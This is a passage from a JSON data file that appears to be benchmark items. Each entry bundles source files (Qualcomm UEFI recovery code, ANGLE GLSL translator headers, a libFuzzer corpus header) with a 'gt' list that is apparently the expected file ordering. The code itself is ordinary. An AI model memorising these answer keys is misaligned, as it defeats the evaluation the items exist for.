  DEBUG ((EFI_D_ERROR, \"Error Reading from misc partition: %r\\n\", Status));\n    return Status;\n  }\n\n  if (!PartitionData) {\n    DEBUG ((EFI_D_ERROR, \"Error in loading Data from misc partition\\n\"));\n    return EFI_INVALID_PARAMETER;\n  }\n\n  Msg = (CardType == NAND) ?\n           (struct RecoveryMessage *) ((CHAR8 *) PartitionData + PageSize) :\n           (struct RecoveryMessage *) PartitionData;\n\n\n  Msg->command[sizeof (Msg->command) - 1] = '\\0';\n  if (Msg->command[0] != 0 && Msg->command[0] != 255)\n    DEBUG ((EFI_D_VERBOSE, \"Recovery command: %d %a\\n\", sizeof (Msg->command),\n            Msg->command));\n\n  if (!AsciiStrnCmp (Msg->command, RECOVERY_BOOT_RECOVERY,\n                       AsciiStrLen (RECOVERY_BOOT_RECOVERY))) {\n    *BootIntoRecovery = TRUE;\n  }\n\n\n  if ( IsDynamicPartitionSupport () &&\n       !AsciiStrnCmp (Msg->command, RECOVERY_BOOT_FASTBOOT,\n                          AsciiStrLen (RECOVERY_BOOT_FASTBOOT))) {\n    *BootIntoRecovery = TRUE;\n  }\n\n  FreePool (PartitionData);\n  PartitionData = NULL;\n  Msg = NULL;\n\n  return Status;\n}\n\nEFI_STATUS\nGetFfbmCommand (CHAR8 *FfbmString, UINT32 Sz)\n{\n  CONST CHAR8 *FfbmCmd = \"ffbm-\";\n  CONST CHAR8 *QmmiCmd = \"qmmi\";\n  CONST CHAR8 *Ffbm02Cmd = \"ffbm-02\";\n  CHAR8 *FfbmData = NULL;\n  EFI_STATUS Status;\n  EFI_GUID Ptype = gEfiMiscPartitionGuid;\n  MemCardType CardType = UNKNOWN;\n\n  CardType = CheckRootDeviceType ();\n  if (CardType == NAND) {\n    Status = GetNandMiscPartiGuid (&Ptype);\n    if (Status != EFI_SUCCESS) {\n      return Status;\n    }\n  }\n\n  Status = ReadFromPartition (&Ptype, (VOID **)&FfbmData, Sz);\n  if (Status != EFI_SUCCESS) {\n    DEBUG ((EFI_D_ERROR, \"Error Reading FFBM info from misc: %r\\n\", Status));\n    return Status;\n  }\n\n  FfbmData[Sz - 1] = '\\0';\n  if (!AsciiStrnCmp (FfbmData, QmmiCmd, AsciiStrLen (QmmiCmd))||\n    !AsciiStrnCmp (FfbmData, Ffbm02Cmd, AsciiStrLen (Ffbm02Cmd))) {\n\n    AsciiStrnCpyS (FfbmString, Sz, QmmiCmd, AsciiStrLen (QmmiCmd));\n  } else if (!AsciiStrnCmp (FfbmData, FfbmCmd, AsciiStrLen (FfbmCmd))) {\n    AsciiStrnCpyS (FfbmString, Sz, FfbmData, Sz);\n  } else {\n    Status = EFI_NOT_FOUND;\n  }\n\n  FreePool (FfbmData);\n  FfbmData = NULL;\n\n  return Status;\n}\n",
        "gt": [
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/Recovery.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Include/Library/BootLinux.h'",
            "'mu_andromeda_platforms/Platforms/QcomModulePkg/Library/BootLib/Recovery.c'"
        ]
    },
    {
        "files": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/ParseContext.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/OutputGLSLBase.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/OutputGLSL.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/DirectiveHandler.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Pragma.h'"
        ],
        "content": "'freshplayerplugin/3rdparty/angle/src/compiler/translator/ParseContext.h'\n:\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_PARSECONTEXT_H_\n#define COMPILER_TRANSLATOR_PARSECONTEXT_H_\n\n#include \"compiler/translator/Compiler.h\"\n#include \"compiler/translator/Diagnostics.h\"\n#include \"compiler/translator/DirectiveHandler.h\"\n#include \"compiler/translator/Intermediate.h\"\n#include \"compiler/translator/SymbolTable.h\"\n#include \"compiler/preprocessor/Preprocessor.h\"\n\nstruct TMatrixFields\n{\n    bool wholeRow;\n    bool wholeCol;\n    int row;\n    int col;\n};\n\n\n\n\n\nclass TParseContext : angle::NonCopyable\n{\n  public:\n    TParseContext(TSymbolTable &symt,\n                  TExtensionBehavior &ext,\n                  TIntermediate &interm,\n                  sh::GLenum type,\n                  ShShaderSpec spec,\n                  int options,\n                  bool checksPrecErrors,\n                  TInfoSink &is,\n                  bool debugShaderPrecisionSupported)\n        : intermediate(interm),\n          symbolTable(symt),\n          mDeferredSingleDeclarationErrorCheck(false),\n          mShaderType(type),\n          mShaderSpec(spec),\n          mShaderVersion(100),\n          mTreeRoot(nullptr),\n          mLoopNestingLevel(0),\n          mStructNestingLevel(0),\n          mSwitchNestingLevel(0),\n          mCurrentFunctionType(nullptr),\n          mFunctionReturnsValue(false),\n          mChecksPrecisionErrors(checksPrecErrors),\n          mFragmentPrecisionHigh(false),\n          mDefaultMatrixPacking(EmpColumnMajor),\n          mDefaultBlockStorage(EbsShared),\n          mDiagnostics(is),\n          mDirectiveHandler(ext, mDiagnostics, mShaderVersion, debugShaderPrecisionSupported),\n          mPreprocessor(&mDiagnostics, &mDirectiveHandler),\n          mScanner(nullptr),\n          mUsesFragData(false),\n          mUsesFragColor(false),\n          mUsesSecondaryOutputs(false)\n    {\n    }\n\n    const pp::Preprocessor &getPreprocessor() const { return mPreprocessor; }\n    pp::Preprocessor &getPreprocessor() { return mPreprocessor; }\n    void *getScanner() const { return mScanner; }\n    void setScanner(void *scanner) { mScanner = scanner; }\n    int getShaderVersion() const { return mShaderVersion; }\n    sh::GLenum getShaderType() const { return mShaderType; }\n    ShShaderSpec getShaderSpec() const { return mShaderSpec; }\n    int numErrors() const { return mDiagnostics.numErrors(); }\n    TInfoSink &infoSink() { return mDiagnostics.infoSink(); }\n    void error(const TSourceLoc &loc, const char *reason, const char *token,\n               const char *extraInfo=\"\");\n    void warning(const TSourceLoc &loc, const char *reason, const char *token,\n                 const char *extraInfo=\"\");\n\n    void recover();\n    TIntermNode *getTreeRoot() const { return mTreeRoot; }\n    void setTreeRoot(TIntermNode *treeRoot) { mTreeRoot = treeRoot; }\n\n    bool getFragmentPrecisionHigh() const { return mFragmentPrecisionHigh; }\n    void setFragmentPrecisionHigh(bool fragmentPrecisionHigh)\n    {\n        mFragmentPrecisionHigh = fragmentPrecisionHigh;\n    }\n\n    bool getFunctionReturnsValue() const { return mFunctionReturnsValue; }\n    void setFunctionReturnsValue(bool functionReturnsValue)\n    {\n        mFunctionReturnsValue = functionReturnsValue;\n    }\n\n    void setLoopNestingLevel(int loopNestintLevel)\n    {\n        mLoopNestingLevel = loopNestintLevel;\n    }\n\n    const TType *getCurrentFunctionType() const { return mCurrentFunctionType; }\n    void setCurrentFunctionType(const TType *currentFunctionType)\n    {\n        mCurrentFunctionType = currentFunctionType;\n    }\n\n    void incrLoopNestingLevel() { ++mLoopNestingLevel; }\n    void decrLoopNestingLevel() { --mLoopNestingLevel; }\n\n    void incrSwitchNestingLevel() { ++mSwitchNestingLevel; }\n    void decrSwitchNestingLevel() { --mSwitchNestingLevel; }\n\n\n    const TVariable *getNamedVariable(const TSourceLoc &location, const TString *name, const TSymbol *symbol);\n\n    bool parseVectorFields(const TString&, int vecSize, TVectorFields&, const TSourceLoc &line);\n\n    bool reservedErrorCheck(const TSourceLoc &line, const TString &identifier);\n    void assignError(const TSourceLoc &line, const char *op, TString left, TString right);\n    void unaryOpError(const TSourceLoc &line, const char *op, TString operand);\n    void binaryOpError(const TSourceLoc &line, const char *op, TString left, TString right);\n    bool precisionErrorCheck(const TSourceLoc &line, TPrecision precision, TBasicType type);\n    bool lValueErrorCheck(const TSourceLoc &line, const char *op, TIntermTyped*);\n    bool constErrorCheck(TIntermTyped *node);\n    bool integerErrorCheck(TIntermTyped *node, const char *token);\n    bool globalErrorCheck(const TSourceLoc &line, bool global, const char *token);\n    bool constructorErrorCheck(const TSourceLoc &line, TIntermNode*, TFunction&, TOperator, TType*);\n    bool arraySizeErrorCheck(const TSourceLoc &line, TIntermTyped *expr, int &size);\n    bool arrayQualifierErrorCheck(const TSourceLoc &line, const TPublicType &type);\n    bool arrayTypeErrorCheck(const TSourceLoc &line, const TPublicType &type);\n    bool voidErrorCheck(const TSourceLoc &line, const TString &identifier, const TBasicType &type);\n    bool boolErrorCheck(const TSourceLoc&, const TIntermTyped*);\n    bool boolErrorCheck(const TSourceLoc&, const TPublicType&);\n    bool samplerErrorCheck(const TSourceLoc &line, const TPublicType &pType, const char *reason);\n    bool locationDeclaratorListCheck(const TSourceLoc &line, const TPublicType &pType);\n    bool parameterSamplerErrorCheck(const TSourceLoc &line, TQualifier qualifier, const TType &type);\n    bool paramErrorCheck(const TSourceLoc &line, TQualifier qualifier, TQualifier paramQualifier, TType *type);\n    bool extensionErrorCheck(const TSourceLoc &line, const TString&);\n    bool singleDeclarationErrorCheck(const TPublicType &publicType, const TSourceLoc &identifierLocation);\n    bool layoutLocationErrorCheck(const TSourceLoc &location, const TLayoutQualifier &layoutQualifier);\n    bool functionCallLValueErrorCheck(const TFunction *fnCandidate, TIntermAggregate *);\n    void es3InvariantErrorCheck(const TQualifier qualifier, const TSourceLoc &invariantLocation);\n    void es3InputOutputTypeCheck(const TQualifier qualifier,\n                                 const TPublicType &type,\n                                 const TSourceLoc &qualifierLocation);\n\n    const TPragma &pragma() const { return mDirectiveHandler.pragma(); }\n    const TExtensionBehavior &extensionBehavior() const { return mDirectiveHandler.extensionBehavior(); }\n    bool supportsExtension(const char *extension);\n    bool isExtensionEnabled(const char *extension) const;\n    void handleExtensionDirective(const TSourceLoc &loc, const char *extName, const char *behavior);\n    void handlePragmaDirective(const TSourceLoc &loc, const char *name, const char *value, bool stdgl);\n\n    bool containsSampler(const TType &type);\n    bool areAllChildConst(TIntermAggregate *aggrNode);\n    const TFunction* findFunction(\n        const TSourceLoc &line, TFunction *pfnCall, int inputShaderVersion, bool *builtIn = 0);\n    bool executeInitializer(const TSourceLoc &line,\n                            const TString &identifier,\n                            const TPublicType &pType,\n                            TIntermTyped *initializer,\n                            TIntermNode **intermNode);\n\n    TPublicType addFullySpecifiedType(TQualifier qualifier,\n                                      bool invariant,\n                                      TLayoutQualifier layoutQualifier,\n                                      const TPublicType &typeSpecifier);\n\n    TIntermAggregate *parseSingleDeclaration(TPublicType &publicType,\n                                             const TSourceLoc &identifierOrTypeLocation,\n                                             const TString &identifier);\n    TIntermAggregate *parseSingleArrayDeclaration(TPublicType &publicType,\n                                                  const TSourceLoc &identifierLocation,\n                                                  const TString &identifier,\n                                                  const TSourceLoc &indexLocation,\n                                                  TIntermTyped *indexExpression);\n    TIntermAggregate *parseSingleInitDeclaration(const TPublicType &publicType,\n                                                 const TSourceLoc &identifierLocation,\n                                                 const TString &identifier,\n                                                 const TSourceLoc &initLocation,\n                                                 TIntermTyped *initializer);\n\n\n\n    TIntermAggregate *parseSingleArrayInitDeclaration(TPublicType &publicType,\n                                                      const TSourceLoc &identifierLocation,\n                                                      const TString &identifier,\n                                                      const TSourceLoc &indexLocation,\n                                                      TIntermTyped *indexExpression,\n                                                      const TSourceLoc &initLocation,\n                                                      TIntermTyped *initializer);\n\n    TIntermAggregate *parseInvariantDeclaration(const TSourceLoc &invariantLoc,\n                                                const TSourceLoc &identifierLoc,\n                                                const TString *identifier,\n                                                const TSymbol *symbol);\n\n    TIntermAggregate *parseDeclarator(TPublicType &publicType,\n                                      TIntermAggregate *aggregateDeclaration,\n                                      const TSourceLoc &identifierLocation,\n                                      const TString &identifier);\n    TIntermAggregate *parseArrayDeclarator(TPublicType &publicType,\n                                           TIntermAggregate *aggregateDeclaration,\n                                           const TSourceLoc &identifierLocation,\n                                           const TString &identifier,\n                                           const TSourceLoc &arrayLocation,\n                                           TIntermTyped *indexExpression);\n    TIntermAggregate *parseInitDeclarator(const TPublicType &publicType,\n                                          TIntermAggregate *aggregateDeclaration,\n                                          const TSourceLoc &identifierLocation,\n                                          const TString &identifier,\n                                          const TSourceLoc &initLocation,\n                                          TIntermTyped *initializer);\n\n\n    TIntermAggregate *parseArrayInitDeclarator(const TPublicType &publicType,\n                                               TIntermAggregate *aggregateDeclaration,\n                                               const TSourceLoc &identifierLocation,\n                                               const TString &identifier,\n                                               const TSourceLoc &indexLocation,\n                                               TIntermTyped *indexExpression,\n                                               const TSourceLoc &initLocation,\n                                               TIntermTyped *initializer);\n\n    void parseGlobalLayoutQualifier(const TPublicType &typeQualifier);\n    void parseFunctionPrototype(const TSourceLoc &location,\n                                TFunction *function,\n                                TIntermAggregate **aggregateOut);\n    TFunction *parseFunctionDeclarator(const TSourceLoc &location,\n                                       TFunction *function);\n    TFunction *addConstructorFunc(const TPublicType &publicType);\n    TIntermTyped *addConstructor(TIntermNode *arguments,\n                                 TType *type,\n                                 TOperator op,\n                                 TFunction *fnCall,\n                                 const TSourceLoc &line);\n    TIntermTyped *foldConstConstructor(TIntermAggregate *aggrNode, const TType &type);\n    TIntermTyped *addConstVectorNode(TVectorFields&, TIntermTyped*, const TSourceLoc&);\n    TIntermTyped *addConstMatrixNode(int, TIntermTyped*, const TSourceLoc&);\n    TIntermTyped *addConstArrayNode(int index, TIntermTyped *node, const TSourceLoc &line);\n    TIntermTyped *addConstStruct(\n        const TString &identifier, TIntermTyped *node, const TSourceLoc& line);\n    TIntermTyped *addIndexExpression(TIntermTyped *baseExpression,\n                                     const TSourceLoc& location,\n                                     TIntermTyped *indexExpression);\n    TIntermTyped* addFieldSelectionExpression(TIntermTyped *baseExpression,\n                                              const TSourceLoc &dotLocation,\n                                              const TString &fieldString,\n                                              const TSourceLoc &fieldLocation);\n\n    TFieldList *addStructDeclaratorList(const TPublicType &typeSpecifier, TFieldList *fieldList);\n    TPublicType addStructure(const TSourceLoc &structLine,\n                             const TSourceLoc &nameLine,\n                             const TString *structName,\n                             TFieldList *fieldList);\n\n    TIntermAggregate* addInterfaceBlock(const TPublicType &typeQualifier,\n                                        const TSourceLoc &nameLine,\n                                        const TString &blockName,\n                                        TFieldList *fieldList,\n                                        const TString *instanceName,\n                                        const TSourceLoc &instanceLine,\n                                        TIntermTyped *arrayIndex,\n                                        const TSourceLoc& arrayIndexLine);\n\n    TLayoutQualifier parseLayoutQualifier(\n        const TString &qualifierType, const TSourceLoc &qualifierTypeLine);\n    TLayoutQualifier parseLayoutQualifier(const TString &qualifierType,\n                                          const TSourceLoc &qualifierTypeLine,\n                                          const TString &intValueString,\n                                          int intValue,\n                                          const TSourceLoc &intValueLine);\n    TLayoutQualifier joinLayoutQualifiers(TLayoutQualifier leftQualifier, TLayoutQualifier rightQualifier);\n    TPublicType joinInterpolationQualifiers(const TSourceLoc &interpolationLoc, TQualifier interpolationQualifier,\n                                            const TSourceLoc &storageLoc, TQualifier storageQualifier);\n\n\n\n\n    bool enterStructDeclaration(const TSourceLoc &line, const TString &identifier);\n    void exitStructDeclaration();\n\n    bool structNestingErrorCheck(const TSourceLoc &line, const TField &field);\n\n    TIntermSwitch *addSwitch(TIntermTyped *init, TIntermAggregate *statementList, const TSourceLoc &loc);\n    TIntermCase *addCase(TIntermTyped *condition, const TSourceLoc &loc);\n    TIntermCase *addDefault(const TSourceLoc &loc);\n\n    TIntermTyped *addUnaryMath(TOperator op, TIntermTyped *child, const TSourceLoc &loc);\n    TIntermTyped *addUnaryMathLValue(TOperator op, TIntermTyped *child, const TSourceLoc &loc);\n    TIntermTyped *addBinaryMath(\n        TOperator op, TIntermTyped *left, TIntermTyped *right, const TSourceLoc &loc);\n    TIntermTyped *addBinaryMathBooleanResult(\n        TOperator op, TIntermTyped *left, TIntermTyped *right, const TSourceLoc &loc);\n    TIntermTyped *addAssign(\n        TOperator op, TIntermTyped *left, TIntermTyped *right, const TSourceLoc &loc);\n\n    TIntermBranch *addBranch(TOperator op, const TSourceLoc &loc);\n    TIntermBranch *addBranch(TOperator op, TIntermTyped *returnValue, const TSourceLoc &loc);\n\n    TIntermTyped *addFunctionCallOrMethod(TFunction *fnCall,\n                                          TIntermNode *paramNode,\n                                          TIntermNode *thisNode,\n                                          const TSourceLoc &loc,\n                                          bool *fatalError);\n\n    TIntermTyped *addTernarySelection(\n        TIntermTyped *cond, TIntermTyped *trueBlock, TIntermTyped *falseBlock, const TSourceLoc &line);\n\n\n    TIntermediate &intermediate;\n    TSymbolTable &symbolTable;\n\n  private:\n    bool declareVariable(const TSourceLoc &line, const TString &identifier, const TType &type, TVariable **variable);\n\n    bool nonInitErrorCheck(const TSourceLoc &line, const TString &identifier, TPublicType *type);\n\n    TIntermTyped *addBinaryMathInternal(\n        TOperator op, TIntermTyped *left, TIntermTyped *right, const TSourceLoc &loc);\n    TIntermTyped *createAssign(\n        TOperator op, TIntermTyped *left, TIntermTyped *right, const TSourceLoc &loc);\n\n\n    TIntermTyped *createUnaryMath(\n        TOperator op, TIntermTyped *child, const TSourceLoc &loc, const TType *funcReturnType);\n\n\n    bool binaryOpCommonCheck(\n        TOperator op, TIntermTyped *left, TIntermTyped *right, const TSourceLoc &loc);\n\n\n    bool mDeferredSingleDeclarationErrorCheck;\n\n    sh::GLenum mShaderType;\n    ShShaderSpec mShaderSpec;\n    int mShaderVersion;\n    TIntermNode *mTreeRoot;\n    int mLoopNestingLevel;\n    int mStructNestingLevel;\n    int mSwitchNestingLevel;\n    const TType *mCurrentFunctionType;\n    bool mFunctionReturnsValue;\n    bool mChecksPrecisionErrors;\n    bool mFragmentPrecisionHigh;\n    TLayoutMatrixPacking mDefaultMatrixPacking;\n    TLayoutBlockStorage mDefaultBlockStorage;\n    TString mHashErrMsg;\n    TDiagnostics mDiagnostics;\n    TDirectiveHandler mDirectiveHandler;\n    pp::Preprocessor mPreprocessor;\n    void *mScanner;\n    bool mUsesFragData;\n    bool mUsesFragColor;\n    bool mUsesSecondaryOutputs;\n\n};\n\nint PaParseStrings(\n    size_t count, const char *const string[], const int length[], TParseContext *context);\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/OutputGLSLBase.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_OUTPUTGLSLBASE_H_\n#define COMPILER_TRANSLATOR_OUTPUTGLSLBASE_H_\n\n#include <set>\n\n#include \"compiler/translator/IntermNode.h\"\n#include \"compiler/translator/LoopInfo.h\"\n#include \"compiler/translator/ParseContext.h\"\n\nclass TOutputGLSLBase : public TIntermTraverser\n{\n  public:\n    TOutputGLSLBase(TInfoSinkBase &objSink,\n                    ShHashFunction64 hashFunction,\n                    NameMap &nameMap,\n                    TSymbolTable& symbolTable,\n                    int shaderVersion,\n                    ShShaderOutput output);\n\n    ShShaderOutput getShaderOutput() const\n    {\n        return mOutput;\n    }\n\n  protected:\n    TInfoSinkBase &objSink() { return mObjSink; }\n    void writeTriplet(Visit visit, const char *preStr, const char *inStr, const char *postStr);\n    void writeVariableType(const TType &type);\n    virtual bool writeVariablePrecision(TPrecision precision) = 0;\n    void writeFunctionParameters(const TIntermSequence &args);\n    const TConstantUnion *writeConstantUnion(const TType &type, const TConstantUnion *pConstUnion);\n    void writeConstructorTriplet(Visit visit, const TType &type, const char *constructorBaseType);\n    TString getTypeName(const TType &type);\n\n    virtual void visitSymbol(TIntermSymbol *node);\n    virtual void visitConstantUnion(TIntermConstantUnion *node);\n    virtual bool visitBinary(Visit visit, TIntermBinary *node);\n    virtual bool visitUnary(Visit visit, TIntermUnary *node);\n    virtual bool visitSelection(Visit visit, TIntermSelection *node);\n    virtual bool visitSwitch(Visit visit, TIntermSwitch *node);\n    virtual bool visitCase(Visit visit, TIntermCase *node);\n    virtual bool visitAggregate(Visit visit, TIntermAggregate *node);\n    virtual bool visitLoop(Visit visit, TIntermLoop *node);\n    virtual bool visitBranch(Visit visit, TIntermBranch *node);\n\n    void visitCodeBlock(TIntermNode *node);\n\n\n\n    TString hashName(const TString &name);\n\n    TString hashVariableName(const TString &name);\n\n    TString hashFunctionNameIfNeeded(const TName &mangledName);\n\n    virtual TString translateTextureFunction(TString &name) { return name; }\n\n  private:\n    bool structDeclared(const TStructure *structure) const;\n    void declareStruct(const TStructure *structure);\n\n    void writeBuiltInFunctionTriplet(Visit visit, const char *preStr, bool useEmulatedFunction);\n\n    TInfoSinkBase &mObjSink;\n    bool mDeclaringVariables;\n\n\n    std::set<int> mDeclaredStructs;\n\n\n    TLoopStack mLoopUnrollStack;\n\n\n    ShHashFunction64 mHashFunction;\n\n    NameMap &mNameMap;\n\n    TSymbolTable &mSymbolTable;\n\n    const int mShaderVersion;\n\n    ShShaderOutput mOutput;\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/OutputGLSL.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_OUTPUTGLSL_H_\n#define COMPILER_TRANSLATOR_OUTPUTGLSL_H_\n\n#include \"compiler/translator/OutputGLSLBase.h\"\n\nclass TOutputGLSL : public TOutputGLSLBase\n{\n  public:\n    TOutputGLSL(TInfoSinkBase& objSink,\n                ShHashFunction64 hashFunction,\n                NameMap& nameMap,\n                TSymbolTable& symbolTable,\n                int shaderVersion,\n                ShShaderOutput output);\n\n  protected:\n    virtual bool writeVariablePrecision(TPrecision);\n    virtual void visitSymbol(TIntermSymbol* node);\n    virtual TString translateTextureFunction(TString& name);\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/DirectiveHandler.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_DIRECTIVEHANDLER_H_\n#define COMPILER_TRANSLATOR_DIRECTIVEHANDLER_H_\n\n#include \"common/angleutils.h\"\n#include \"compiler/translator/ExtensionBehavior.h\"\n#include \"compiler/translator/Pragma.h\"\n#include \"compiler/preprocessor/DirectiveHandlerBase.h\"\n\nclass TDiagnostics;\n\nclass TDirectiveHandler : public pp::DirectiveHandler, angle::NonCopyable\n{\n  public:\n    TDirectiveHandler(TExtensionBehavior& extBehavior,\n                      TDiagnostics& diagnostics,\n                      int& shaderVersion,\n                      bool debugShaderPrecisionSupported);\n    virtual ~TDirectiveHandler();\n\n    const TPragma& pragma() const { return mPragma; }\n    const TExtensionBehavior& extensionBehavior() const { return mExtensionBehavior; }\n\n    virtual void handleError(const pp::SourceLocation& loc,\n                             const std::string& msg);\n\n    virtual void handlePragma(const pp::SourceLocation& loc,\n                              const std::string& name,\n                              const std::string& value,\n                              bool stdgl);\n\n    virtual void handleExtension(const pp::SourceLocation& loc,\n                                 const std::string& name,\n                                 const std::string& behavior);\n\n    virtual void handleVersion(const pp::SourceLocation& loc,\n                               int version);\n\n  private:\n    TPragma mPragma;\n    TExtensionBehavior& mExtensionBehavior;\n    TDiagnostics& mDiagnostics;\n    int& mShaderVersion;\n    bool mDebugShaderPrecisionSupported;\n};\n\n#endif\n\n'freshplayerplugin/3rdparty/angle/src/compiler/translator/Pragma.h'\n:\n\n\n\n\n\n#ifndef COMPILER_TRANSLATOR_PRAGMA_H_\n#define COMPILER_TRANSLATOR_PRAGMA_H_\n\nstruct TPragma\n{\n    struct STDGL\n    {\n        STDGL() : invariantAll(false) { }\n\n        bool invariantAll;\n    };\n\n\n\n\n\n    TPragma() : optimize(true), debug(false), debugShaderPrecision(true) { }\n    TPragma(bool o, bool d) : optimize(o), debug(d), debugShaderPrecision(true) { }\n\n    bool optimize;\n    bool debug;\n    bool debugShaderPrecision;\n    STDGL stdgl;\n};\n\n#endif\n",
        "gt": [
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/Pragma.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/DirectiveHandler.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/ParseContext.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/OutputGLSLBase.h'",
            "'freshplayerplugin/3rdparty/angle/src/compiler/translator/OutputGLSL.h'"
        ]
    },
    {
        "files": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCorpus.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDefs.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDataFlowTrace.h'"
        ],
        "content": "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerCorpus.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_CORPUS\n#define LLVM_FUZZER_CORPUS\n\n#include \"FuzzerDataFlowTrace.h\"\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerRandom.h\"\n#include \"FuzzerSHA1.h\"\n#include \"FuzzerTracePC.h\"\n#include <algorithm>\n#include <numeric>\n#include <random>\n#include <unordered_set>\n\nnamespace fuzzer {\n\nstruct InputInfo {\n  Unit U;\n  uint8_t Sha1[kSHA1NumBytes];\n\n  size_t NumFeatures = 0;\n  size_t Tmp = 0;\n\n  size_t NumExecutedMutations = 0;\n  size_t NumSuccessfullMutations = 0;\n  bool MayDeleteFile = false;\n  bool Reduced = false;\n  bool HasFocusFunction = false;\n  Vector<uint32_t> UniqFeatureSet;\n  Vector<uint8_t> DataFlowTraceForFocusFunction;\n};\n\nclass InputCorpus {\n  static const size_t kFeatureSetSize = 1 << 21;\n public:\n  InputCorpus(const std::string &OutputCorpus) : OutputCorpus(OutputCorpus) {\n    memset(InputSizesPerFeature, 0, sizeof(InputSizesPerFeature));\n    memset(SmallestElementPerFeature, 0, sizeof(SmallestElementPerFeature));\n  }\n  ~InputCorpus() {\n    for (auto II : Inputs)\n      delete II;\n  }\n  size_t size() const { return Inputs.size(); }\n  size_t SizeInBytes() const {\n    size_t Res = 0;\n    for (auto II : Inputs)\n      Res += II->U.size();\n    return Res;\n  }\n  size_t NumActiveUnits() const {\n    size_t Res = 0;\n    for (auto II : Inputs)\n      Res += !II->U.empty();\n    return Res;\n  }\n  size_t MaxInputSize() const {\n    size_t Res = 0;\n    for (auto II : Inputs)\n        Res = std::max(Res, II->U.size());\n    return Res;\n  }\n\n  size_t NumInputsThatTouchFocusFunction() {\n    return std::count_if(Inputs.begin(), Inputs.end(), [](const InputInfo *II) {\n      return II->HasFocusFunction;\n    });\n  }\n\n  size_t NumInputsWithDataFlowTrace() {\n    return std::count_if(Inputs.begin(), Inputs.end(), [](const InputInfo *II) {\n      return !II->DataFlowTraceForFocusFunction.empty();\n    });\n  }\n\n  bool empty() const { return Inputs.empty(); }\n  const Unit &operator[] (size_t Idx) const { return Inputs[Idx]->U; }\n  InputInfo *AddToCorpus(const Unit &U, size_t NumFeatures, bool MayDeleteFile,\n                         bool HasFocusFunction,\n                         const Vector<uint32_t> &FeatureSet,\n                         const DataFlowTrace &DFT, const InputInfo *BaseII) {\n    assert(!U.empty());\n    if (FeatureDebug)\n      Printf(\"ADD_TO_CORPUS %zd NF %zd\\n\", Inputs.size(), NumFeatures);\n    Inputs.push_back(new InputInfo());\n    InputInfo &II = *Inputs.back();\n    II.U = U;\n    II.NumFeatures = NumFeatures;\n    II.MayDeleteFile = MayDeleteFile;\n    II.UniqFeatureSet = FeatureSet;\n    II.HasFocusFunction = HasFocusFunction;\n    std::sort(II.UniqFeatureSet.begin(), II.UniqFeatureSet.end());\n    ComputeSHA1(U.data(), U.size(), II.Sha1);\n    auto Sha1Str = Sha1ToString(II.Sha1);\n    Hashes.insert(Sha1Str);\n    if (HasFocusFunction)\n      if (auto V = DFT.Get(Sha1Str))\n        II.DataFlowTraceForFocusFunction = *V;\n\n\n\n    if (II.DataFlowTraceForFocusFunction.empty() && BaseII)\n      II.DataFlowTraceForFocusFunction = BaseII->DataFlowTraceForFocusFunction;\n    UpdateCorpusDistribution();\n    PrintCorpus();\n\n    return &II;\n  }\n\n\n  void PrintUnit(const Unit &U) {\n    if (!FeatureDebug) return;\n    for (uint8_t C : U) {\n      if (C != 'F' && C != 'U' && C != 'Z')\n        C = '.';\n      Printf(\"%c\", C);\n    }\n  }\n\n\n  void PrintFeatureSet(const Vector<uint32_t> &FeatureSet) {\n    if (!FeatureDebug) return;\n    Printf(\"{\");\n    for (uint32_t Feature: FeatureSet)\n      Printf(\"%u,\", Feature);\n    Printf(\"}\");\n  }\n\n\n  void PrintCorpus() {\n    if (!FeatureDebug) return;\n    Printf(\"======= CORPUS:\\n\");\n    int i = 0;\n    for (auto II : Inputs) {\n      if (std::find(II->U.begin(), II->U.end(), 'F') != II->U.end()) {\n        Printf(\"[%2d] \", i);\n        Printf(\"%s sz=%zd \", Sha1ToString(II->Sha1).c_str(), II->U.size());\n        PrintUnit(II->U);\n        Printf(\" \");\n        PrintFeatureSet(II->UniqFeatureSet);\n        Printf(\"\\n\");\n      }\n      i++;\n    }\n  }\n\n  void Replace(InputInfo *II, const Unit &U) {\n    assert(II->U.size() > U.size());\n    Hashes.erase(Sha1ToString(II->Sha1));\n    DeleteFile(*II);\n    ComputeSHA1(U.data(), U.size(), II->Sha1);\n    Hashes.insert(Sha1ToString(II->Sha1));\n    II->U = U;\n    II->Reduced = true;\n    UpdateCorpusDistribution();\n  }\n\n  bool HasUnit(const Unit &U) { return Hashes.count(Hash(U)); }\n  bool HasUnit(const std::string &H) { return Hashes.count(H); }\n  InputInfo &ChooseUnitToMutate(Random &Rand) {\n    InputInfo &II = *Inputs[ChooseUnitIdxToMutate(Rand)];\n    